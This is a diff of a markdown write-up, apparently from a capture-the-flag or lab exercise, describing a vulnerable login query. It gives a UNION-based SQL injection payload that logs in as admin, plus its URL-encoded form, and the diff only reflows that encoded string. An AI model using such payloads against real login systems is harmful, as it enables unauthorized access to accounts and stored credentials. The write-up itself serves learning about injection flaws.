@@ -46,7 +46,9 @@ the `login` function uses the function `query_db` to query the database which ta
 the SQL query used to retrieve a user seems to be vulnerable.Using this payload (`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `) ,I was able to login as an admin.
 
 URL-Encoding(`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `)\
-==  `%74%65%73%74%73%71%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%20%75%73%65%72%6e%61%6d%65%2c%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%61%64%6d%69%6e`
+==  `%74%65%73%74%73%71%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%20%75%73%65\
+%72%6e%61%6d%65%2c%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52\
+%45%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%61%64%6d%69%6e`
 
 
 ![elmoudir.png](/static/images/elmoudir.png)
